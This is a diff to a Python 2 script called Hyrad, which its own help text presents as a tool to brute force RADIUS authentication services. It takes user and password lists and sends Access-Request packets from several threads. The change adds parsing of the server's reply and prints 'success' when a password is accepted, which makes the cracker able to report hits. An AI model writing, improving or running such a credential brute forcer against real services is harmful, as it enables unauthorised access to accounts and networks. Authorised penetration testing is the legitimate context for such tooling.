@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 
-from multiprocessing.dummy import Pool 
+from multiprocessing.dummy import Pool
 import socket, hashlib, argparse, re, textwrap, sys
 
 
@@ -20,7 +20,7 @@ class bcolors:
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
 
-# convert num to hex, i.e. 1 => \x01, 10 => \x0A etc. 
+# convert num to hex, i.e. 1 => \x01, 10 => \x0A etc.
 # least_num_of_byte controls whether padding would be done. e.g. num =1, least_num_of_byte = 2 => \x00\x01
 def int_to_hex(num, least_num_of_byte = 1):
     hex_length = 2*least_num_of_byte + 2
@@ -75,12 +75,16 @@ def brute(user):
         pkt_len_hex = int_to_hex(pkt_len%65536, 2) # 65536 = 2^16 = 2 bytes available for length
 
         # send it
-        socket.sendto(RADIUS_CODE + pack_id + pkt_len_hex + AUTHENTICATOR + AVP_UNAME_TYPE + avp_uname_len_hex + user + AVP_PWD_TYPE + avp_pwd_len_hex + encrypted, (args.ip, args.port))
+        socket.sendto(RADIUS_CODE + pack_id + pkt_len_hex + AUTHENTICATOR + AVP_UNAME_TYPE + avp_uname_len_hex + user + AVP_PWD_TYPE + avp_pwd_len_hex + encrypted, (args.ip, int(args.port)))
+        resp_hex = socket.recv(2048).encode("hex")
+        resp_code = resp_hex[:2]
+        if resp_code == "02":
+            print "success with secret: %s and password: %s" % (args.secret, pwd)
 
 # parse arguments
-parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter, 
+parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter,
     description=textwrap.dedent('''\
-        %sHyrad - v0.2
+        %sHyrad - v0.3
         An utility tool to brute force authentication service using Radius protocol.%s
     ''' % (bcolors.OKGREEN, bcolors.ENDC)))
 
@@ -88,7 +92,7 @@ parser.add_argument('ip', metavar="IP", help="Required. The IP address where the
 parser.add_argument('-P', '--port', dest="port", help="The port of the radius service. Default 1812", default=1812)
 parser.add_argument('-u', '--username', dest="user", help="The username to be used.")
 parser.add_argument('--userlist', dest="userlist", help="The list of users to be used.")
-parser.add_argument('-p', '--password', dest="password", help="The list of password to be used.")
+parser.add_argument('-p', '--password', dest="password", help="The password to be used.")
 parser.add_argument('--passlist', dest="passlist", help="The list of passwords to be tried.")
 parser.add_argument('-s', '--secret', dest="secret", help="Required. The shared secret to be used", required=True)
 parser.add_argument('-t', '--thread', dest="thread", help="The number of threads to be used. Default 4", default=4)
@@ -110,7 +114,7 @@ if len(allusers) == 0:
     sys.exit(2)
 
 # rid of new lines etc
-allusers = [x.strip() for x in allusers] 
+allusers = [x.strip() for x in allusers]
 
 # get the final list of passwords
 allpasses = []
@@ -126,7 +130,7 @@ if len(allpasses) == 0:
     parser.print_help()
     sys.exit(2)
 
-allpasses = [x.strip() for x in allpasses] 
+allpasses = [x.strip() for x in allpasses]
 
 # prepare socket
 socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -136,4 +140,3 @@ pool.map(brute, allusers)
 
 pool.close()
 pool.join()
-
